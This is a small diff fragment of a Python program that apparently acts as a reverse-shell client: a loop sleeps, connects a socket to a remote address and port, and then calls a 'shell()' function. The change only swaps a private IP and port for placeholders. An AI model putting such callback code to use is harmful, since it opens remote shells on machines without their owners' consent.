@@ -24,7 +24,7 @@ def connection():
 	while True:
 		time.sleep(20)
 		try:
-			s.connect(('192.168.1.125',5555))
+			s.connect(('xxx.xxx.xxx.xxx',pppp))
 			shell()
 			s.close()
 			break
